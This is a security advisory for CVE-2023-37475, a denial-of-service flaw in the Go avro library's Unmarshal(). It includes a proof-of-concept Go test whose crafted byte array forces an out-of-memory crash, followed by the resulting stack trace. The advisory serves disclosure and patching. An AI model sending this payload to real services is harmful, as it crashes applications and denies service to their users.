# avro vulnerable to denial of service via attacker-controlled parameter

**GHSA**: GHSA-9x44-9pgq-cf45 | **CVE**: CVE-2023-37475 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400

**Affected Packages**:
- **github.com/hamba/avro** (go): < 2.13.0
- **github.com/hamba/avro/v2** (go): < 2.13.0

## Description

### Summary
A well-crafted string passed to avro's `github.com/hamba/avro/v2.Unmarshal()` can throw a `fatal error: runtime: out of memory` which is unrecoverable and can cause denial of service of the consumer of avro.

### Details
The root cause of the issue is that avro uses part of the input to `Unmarshal()` to determine the size when creating a new slice.

In the reproducer below, the first few bytes determine the size of the slice.

The root cause is on line 239 here:
https://github.com/hamba/avro/blob/3abfe1e6382c5dccf2e1a00260c51a64bc1f1ca1/reader.go#L216-L242

### PoC
The issue was found during a security audit of Dapr, and I attach a reproducer that shows how the issue affects Dapr.

Dapr uses an older version of the avro library, but it is also affected if bumping avro to latest.

To reproduce:
```bash
cd /tmp
git clone --depth=1 https://github.com/dapr/components-contrib
cd components-contrib/pubsub/pulsar
```
now add this test to the `pulsar_test.go`:
```golang
func TestParsePublishMetadata2(t *testing.T) {
        m := &pubsub.PublishRequest{}
        m.Data = []byte{246, 255, 255, 255, 255, 10, 255, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
        _, _ = parsePublishMetadata(m, schemaMetadata{protocol: avroProtocol, value: "bytes"})
}
```
run the test with `go test -run=TestParsePublishMetadata2`.

You should see this stacktrace:

```
fatal error: runtime: out of memory                                                                                                                                
                                                                                 
runtime stack:                                                                                                                                                                                                                                                                                                                        
runtime.throw({0xc32c9c?, 0x8000?})                                              
        /usr/local/go/src/runtime/panic.go:1047 +0x5d fp=0x7ffd9b347ed8 sp=0x7ffd9b347ea8 pc=0x445a9d                                                                                                                                                                                                                                 
runtime.sysMapOS(0xc000400000, 0x2c00000000?)                                                                                                                      
        /usr/local/go/src/runtime/mem_linux.go:187 +0x11b fp=0x7ffd9b347f20 sp=0x7ffd9b347ed8 pc=0x424dfb                                                                                                                                                                                                                             
runtime.sysMap(0x11ab260?, 0xc3ffffffff?, 0x11bb3f8?)                                                                                                              
        /usr/local/go/src/runtime/mem.go:142 +0x35 fp=0x7ffd9b347f50 sp=0x7ffd9b347f20 pc=0x4247d5                                                                                                                                                                                                                                    
runtime.(*mheap).grow(0x11ab260, 0x1600000?)                                     
        /usr/local/go/src/runtime/mheap.go:1522 +0x252 fp=0x7ffd9b347fc8 sp=0x7ffd9b347f50 pc=0x436832                                                                                                                                                                                                                                
runtime.(*mheap).allocSpan(0x11ab260, 0x1600000, 0x0, 0xae?)                                                                                                       
        /usr/local/go/src/runtime/mheap.go:1243 +0x1b7 fp=0x7ffd9b348060 sp=0x7ffd9b347fc8 pc=0x435f77                                                                                                                                                                                                                                
runtime.(*mheap).alloc.func1()                                                                                                                                     
        /usr/local/go/src/runtime/mheap.go:961 +0x65 fp=0x7ffd9b3480a8 sp=0x7ffd9b348060 pc=0x435a25                                                                                                                                                                                                                                  
runtime.systemstack()                                                            
        /usr/local/go/src/runtime/asm_amd64.s:496 +0x49 fp=0x7ffd9b3480b0 sp=0x7ffd9b3480a8 pc=0x47a469                                                                                                                                                                                                                               
                                                                                 
goroutine 22 [running]:                                                                                                                                                                                                                                                                                                               
runtime.systemstack_switch()                                                     
        /usr/local/go/src/runtime/asm_amd64.s:463 fp=0xc000080930 sp=0xc000080928 pc=0x47a400                                                                                                                                                                                                                                         
runtime.(*mheap).alloc(0x422a90?, 0x1160f40?, 0x38?)                                                                                                               
        /usr/local/go/src/runtime/mheap.go:955 +0x65 fp=0xc000080978 sp=0xc000080930 pc=0x435965                                                                                                                                                                                                                                      
runtime.(*mcache).allocLarge(0x2?, 0x2bfffffffb, 0x1)                                                                                                              
        /usr/local/go/src/runtime/mcache.go:234 +0x85 fp=0xc0000809c0 sp=0xc000080978 pc=0x423865                                                                                                                                                                                                                                     
runtime.mallocgc(0x2bfffffffb, 0xb44860, 0x1)                                                                                                                      
        /usr/local/go/src/runtime/malloc.go:1053 +0x4fe fp=0xc000080a28 sp=0xc0000809c0 pc=0x41a57e                                                                                                                                                                                                                                   
runtime.makeslice(0xc00024cd20?, 0x4d8560d018?, 0xc000080b18?)                                                                                                     
        /usr/local/go/src/runtime/slice.go:103 +0x52 fp=0xc000080a50 sp=0xc000080a28 pc=0x45de72                                                                                                                                                                                                                                      
github.com/hamba/avro/v2.(*Reader).readBytes(0xc00024cd20, {0xc27ca1, 0x5})                                                                                        
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:239 +0x1b7 fp=0xc000080ac0 sp=0xc000080a50 pc=0x834417                                                                                                                                                                                                       
github.com/hamba/avro/v2.(*Reader).ReadBytes(...)                                                                                                                  
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:203                                                                                       
github.com/hamba/avro/v2.(*Reader).ReadNext(0xfaf5531d980c4e50?, {0xd24d90, 0xc0001a1da0})                                                                                                                                                                                                                                            
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader_generic.go:63 +0x44c fp=0xc000080ca0 sp=0xc000080ac0 pc=0x8349ec                                                                                                                                                                                                
github.com/hamba/avro/v2.(*efaceDecoder).Decode(0xc0001188f0?, 0xc00019fd10, 0xc0001a1da0?)                                                                                                                                                                                                                                           
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec_dynamic.go:18 +0x1a5 fp=0xc000080d18 sp=0xc000080ca0 pc=0x8221c5                                                                                                                                                                                                 
github.com/hamba/avro/v2.(*Reader).ReadVal(0xc00024cd20, {0xd24d90, 0xc0001a1da0}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                                                                          
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec.go:53 +0x139 fp=0xc000080d98 sp=0xc000080d18 pc=0x8200f9                                                                                                                                                                                                         
github.com/hamba/avro/v2.(*frozenConfig).Unmarshal(0xc000158080, {0xd24d90, 0xc0001a1da0}, {0xc00013a640?, 0x535d2f?, 0x536253?}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                           
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/config.go:150 +0x6e fp=0xc000080de8 sp=0xc000080d98 pc=0x832b2e                                                                                                                                                                                                        
github.com/hamba/avro/v2.Unmarshal(...)                                                                                                                                                                                                                                                                                               
        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/decoder.go:49                                                                                                                                                                                                                                                          
github.com/dapr/components-contrib/pubsub/pulsar.parsePublishMetadata(0xc000080f18, {{0xc27698?, 0x59a?}, {0xc27ca1?, 0x536220?}})                                                                                                                                                                                                    
        /tmp/components-contrib/pubsub/pulsar/pulsar.go:300 +0x1f5 fp=0xc000080ef0 sp=0xc000080de8 pc=0xa3c1d5                                                                                                                                                                                                                        
github.com/dapr/components-contrib/pubsub/pulsar.TestParsePublishMetadata2(0x413239?)                                                                              
        /tmp/components-contrib/pubsub/pulsar/pulsar_test.go:154 +0xb0 fp=0xc000080f70 sp=0xc000080ef0 pc=0xa3d1b0                                                                                                                                                                                                                    
testing.tRunner(0xc0001b56c0, 0xc789e0)                                                                                                                            
        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc000080fc0 sp=0xc000080f70 pc=0x53632b                                                                                                                                                                                                                                  
testing.(*T).Run.func1()                                                                                                                                           
        /usr/local/go/src/testing/testing.go:1629 +0x2a fp=0xc000080fe0 sp=0xc000080fc0 pc=0x53736a                                                                                                                                                                                                                                   
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000080fe8 sp=0xc000080fe0 pc=0x47c621                                                                                                                                                                                                                                   
created by testing.(*T).Run                                                      
        /usr/local/go/src/testing/testing.go:1629 +0x3ea                                                                                                                                                                                                                                                                              
 
goroutine 1 [chan receive]:                                                                                                                                                                                                                                                                                                           
runtime.gopark(0x1193660?, 0xc000122900?, 0xf0?, 0x28?, 0xc00019da28?)                                                                                             
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00019d9a8 sp=0xc00019d988 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.chanrecv(0xc0002423f0, 0xc00019daa7, 0x1)                                                                                                                                                                                                                                                                                     
        /usr/local/go/src/runtime/chan.go:583 +0x49d fp=0xc00019da38 sp=0xc00019d9a8 pc=0x4137fd                                                                                                                                                                                                                                      
runtime.chanrecv1(0x11926e0?, 0xb445e0?)                                         
        /usr/local/go/src/runtime/chan.go:442 +0x18 fp=0xc00019da60 sp=0xc00019da38 pc=0x4132f8                                                                                                                                                                                                                                       
testing.(*T).Run(0xc0001b5520, {0xc34a0b?, 0x535ba5?}, 0xc789e0)                                                                                                   
        /usr/local/go/src/testing/testing.go:1630 +0x405 fp=0xc00019db20 sp=0xc00019da60 pc=0x5371e5                                                                                                                                                                                                                                  
testing.runTests.func1(0x1193660?)                                               
        /usr/local/go/src/testing/testing.go:2036 +0x45 fp=0xc00019db70 sp=0xc00019db20 pc=0x5393a5                                                                                                                                                                                                                                   
testing.tRunner(0xc0001b5520, 0xc00019dc88)                                      
        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc00019dbc0 sp=0xc00019db70 pc=0x53632b                                                                                                                                                                                                                                  
testing.runTests(0xc000228820?, {0x11487c0, 0xa, 0xa}, {0xc00023fb60?, 0x100c00019dd10?, 0x1192d20?})                                                                                                                                                                                                                                 
        /usr/local/go/src/testing/testing.go:2034 +0x489 fp=0xc00019dcb8 sp=0xc00019dbc0 pc=0x539289                                                                                                                                                                                                                                  
testing.(*M).Run(0xc000228820)                                                   
        /usr/local/go/src/testing/testing.go:1906 +0x63a fp=0xc00019df00 sp=0xc00019dcb8 pc=0x537bfa                                                                                                                                                                                                                                  
main.main()                                                                      
        _testmain.go:65 +0x1aa fp=0xc00019df80 sp=0xc00019df00 pc=0xa3f9ea                                                                                         
runtime.main()                                                                   
        /usr/local/go/src/runtime/proc.go:250 +0x207 fp=0xc00019dfe0 sp=0xc00019df80 pc=0x4483c7                                                                                                                                                                                                                                      
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00019dfe8 sp=0xc00019dfe0 pc=0x47c621                                                                                                                                                                                                                                   

goroutine 2 [force gc (idle)]:                                                   
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006cfb0 sp=0xc00006cf90 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.goparkunlock(...)                                                        
        /usr/local/go/src/runtime/proc.go:387                                                                                                                      
runtime.forcegchelper()                                                          
        /usr/local/go/src/runtime/proc.go:305 +0xb0 fp=0xc00006cfe0 sp=0xc00006cfb0 pc=0x448630                                                                                                                                                                                                                                       
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006cfe8 sp=0xc00006cfe0 pc=0x47c621                                                                                                                                                                                                                                   
created by runtime.init.6                                                        
        /usr/local/go/src/runtime/proc.go:293 +0x25                                                                                                                

goroutine 3 [GC sweep wait]:                                                     
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006d780 sp=0xc00006d760 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.goparkunlock(...)                                                        
        /usr/local/go/src/runtime/proc.go:387                                                                                                                      
runtime.bgsweep(0x0?)                                                            
        /usr/local/go/src/runtime/mgcsweep.go:278 +0x8e fp=0xc00006d7c8 sp=0xc00006d780 pc=0x43282e                                                                                                                                                                                                                                   
runtime.gcenable.func1()                                                         
        /usr/local/go/src/runtime/mgc.go:178 +0x26 fp=0xc00006d7e0 sp=0xc00006d7c8 pc=0x427ae6                                                                                                                                                                                                                                        
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006d7e8 sp=0xc00006d7e0 pc=0x47c621                                                                                                                                                                                                                                   
created by runtime.gcenable                                                      
        /usr/local/go/src/runtime/mgc.go:178 +0x6b                                                                                                                 

goroutine 4 [GC scavenge wait]:                                                  
runtime.gopark(0xc00003c070?, 0xd19648?, 0x1?, 0x0?, 0x0?)                                                                                                         
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006df70 sp=0xc00006df50 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.goparkunlock(...)                                                        
        /usr/local/go/src/runtime/proc.go:387                                                                                                                      
runtime.(*scavengerState).park(0x1192e40)                                        
        /usr/local/go/src/runtime/mgcscavenge.go:400 +0x53 fp=0xc00006dfa0 sp=0xc00006df70 pc=0x430753                                                                                                                                                                                                                                
runtime.bgscavenge(0x0?)                                                         
        /usr/local/go/src/runtime/mgcscavenge.go:628 +0x45 fp=0xc00006dfc8 sp=0xc00006dfa0 pc=0x430d25                                                                                                                                                                                                                                
runtime.gcenable.func2()                                                         
        /usr/local/go/src/runtime/mgc.go:179 +0x26 fp=0xc00006dfe0 sp=0xc00006dfc8 pc=0x427a86                                                                                                                                                                                                                                        
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006dfe8 sp=0xc00006dfe0 pc=0x47c621                                                                                                                                                                                                                                   
created by runtime.gcenable                                                      
        /usr/local/go/src/runtime/mgc.go:179 +0xaa                                                                                                                 

goroutine 18 [finalizer wait]:                                                   
runtime.gopark(0x1a0?, 0x1193660?, 0xe0?, 0x24?, 0xc00006c770?)                                                                                                    
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006c628 sp=0xc00006c608 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.runfinq()                                                                
        /usr/local/go/src/runtime/mfinal.go:193 +0x107 fp=0xc00006c7e0 sp=0xc00006c628 pc=0x426b27                                                                                                                                                                                                                                    
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006c7e8 sp=0xc00006c7e0 pc=0x47c621                                                                                                                                                                                                                                   
created by runtime.createfing                                                    
        /usr/local/go/src/runtime/mfinal.go:163 +0x45

goroutine 19 [IO wait]:                                                          
runtime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     
        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc000185a78 sp=0xc000185a58 pc=0x4487f6                                                                                                                                                                                                                                       
runtime.netpollblock(0x0?, 0x4100cf?, 0x0?)                                      
        /usr/local/go/src/runtime/netpoll.go:527 +0xf7 fp=0xc000185ab0 sp=0xc000185a78 pc=0x440e17                                                                                                                                                                                                                                    
internal/poll.runtime_pollWait(0x7f4d85613218, 0x72)                                                                                                               
        /usr/local/go/src/runtime/netpoll.go:306 +0x89 fp=0xc000185ad0 sp=0xc000185ab0 pc=0x476b29                                                                                                                                                                                                                                    
internal/poll.(*pollDesc).wait(0xc000158980?, 0xc0001b0ca0?, 0x0)                                                                                                  
        /usr/local/go/src/internal/poll/fd_poll_runtime.go:84 +0x32 fp=0xc000185af8 sp=0xc000185ad0 pc=0x4b4832                                                                                                                                                                                                                       
internal/poll.(*pollDesc).waitRead(...)                                          
        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89                                                                                                      
internal/poll.(*FD).ReadMsg(0xc000158980, {0xc0001b0ca0, 0x10, 0x10}, {0xc00016a620, 0x1000, 0x1000}, 0x1?)                                                                                                                                                                                                                           
        /usr/local/go/src/internal/poll/fd_unix.go:304 +0x3aa fp=0xc000185be8 sp=0xc000185af8 pc=0x4b6f2a                                                                                                                                                                                                                             
net.(*netFD).readMsg(0xc000158980, {0xc0001b0ca0?, 0x1?, 0xd26db0?}, {0xc00016a620?, 0x1?, 0x5?}, 0xb?)                                                                                                                                                                                                                               
        /usr/local/go/src/net/fd_posix.go:78 +0x37 fp=0xc000185c70 sp=0xc000185be8 pc=0x68cb57                                                                                                                                                                                                                                        
net.(*UnixConn).readMsg(0xc000122690, {0xc0001b0ca0?, 0xc00012f038?, 0xd1da40?}, {0xc00016a620?, 0xd1da40?, 0xc0001b6300?})                                                                                                                                                                                                           
        /usr/local/go/src/net/unixsock_posix.go:115 +0x4f fp=0xc000185d00 sp=0xc000185c70 pc=0x6a7f6f                                                                                                                                                                                                                                 
net.(*UnixConn).ReadMsgUnix(0xc000122690, {0xc0001b0ca0?, 0x422a90?, 0xc0001b6300?}, {0xc00016a620?, 0x41a68a?, 0xc00012f260?})                                                                                                                                                                                                       
        /usr/local/go/src/net/unixsock.go:143 +0x3c fp=0xc000185d78 sp=0xc000185d00 pc=0x6a69bc                                                                                                                                                                                                                                       
github.com/godbus/dbus.(*oobReader).Read(0xc00016a600, {0xc0001b0ca0?, 0xc000185e28?, 0x41aa67?})                                                                                                                                                                                                                                     
        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:21 +0x45 fp=0xc000185df0 sp=0xc000185d78 pc=0x8c1d85                                                                                                                                                                        
io.ReadAtLeast({0xd1e040, 0xc00016a600}, {0xc0001b0ca0, 0x10, 0x10}, 0x10)                                                                                         
        /usr/local/go/src/io/io.go:332 +0x9a fp=0xc000185e38 sp=0xc000185df0 pc=0x4af45a                                                                           
io.ReadFull(...)                                                                 
        /usr/local/go/src/io/io.go:351                                           
github.com/godbus/dbus.(*unixTransport).ReadMessage(0xc00012ea80)                                                                                                  
        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:91 +0x11e fp=0xc000185f68 sp=0xc000185e38 pc=0x8c239e                                                                                                                                                                       
github.com/godbus/dbus.(*Conn).inWorker(0xc0001b2000)                                                                                                              
        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/conn.go:294 +0x3b fp=0xc000185fc8 sp=0xc000185f68 pc=0x8ab47b                                                                                                                                                                                 
github.com/godbus/dbus.(*Conn).Auth.func1()                                      
        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x26 fp=0xc000185fe0 sp=0xc000185fc8 pc=0x8a8766                                                                                                                                                                                 
runtime.goexit()                                                                 
        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000185fe8 sp=0xc000185fe0 pc=0x47c621                                                                                                                                                                                                                                   
created by github.com/godbus/dbus.(*Conn).Auth                                                                                                                     
        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x9ee                                                                                                                                                                                                                            
exit status 2                                                                    
FAIL    github.com/dapr/components-contrib/pubsub/pulsar        0.027s
```

### Impact
Any use case of the avro Unmarshalling routine that accepts untrusted input is affected. 

The impact is that an attacker can crash the running application and cause denial of service.

